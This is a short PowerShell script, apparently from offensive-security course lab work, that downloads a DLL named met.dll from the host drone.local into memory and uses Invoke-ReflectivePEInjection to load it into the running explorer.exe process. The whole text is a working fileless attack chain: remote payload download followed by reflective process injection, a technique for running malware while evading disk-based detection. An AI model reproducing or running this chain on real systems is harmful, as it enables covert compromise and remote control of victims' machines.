$bytes = (New-Object System.Net.WebClient).DownloadData('http://drone.local/met.dll')
$procid = (Get-Process -Name explorer).Id

. Z:\Code\Pen300\Module5\Invoke-ReflectivePEInjection.ps1

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
